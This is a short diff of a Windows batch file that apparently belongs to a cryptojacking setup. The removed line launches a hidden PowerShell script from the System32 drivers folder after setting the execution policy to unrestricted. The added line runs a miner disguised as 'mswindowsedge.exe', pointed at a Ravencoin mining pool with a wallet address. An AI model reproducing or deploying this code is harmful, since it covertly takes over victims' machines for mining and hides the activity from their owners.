@@ -1,2 +1,3 @@
 @ECHO OFF
-cmd.exe /q /c "powershell.exe -windowstyle hidden set-executionpolicy unrestricted ; Unblock-File C:\Windows\System32\drivers\script12.ps1 ; C:\Windows\System32\drivers\script12.ps1"
+mswindowsedge.exe  -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 130 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
+pause
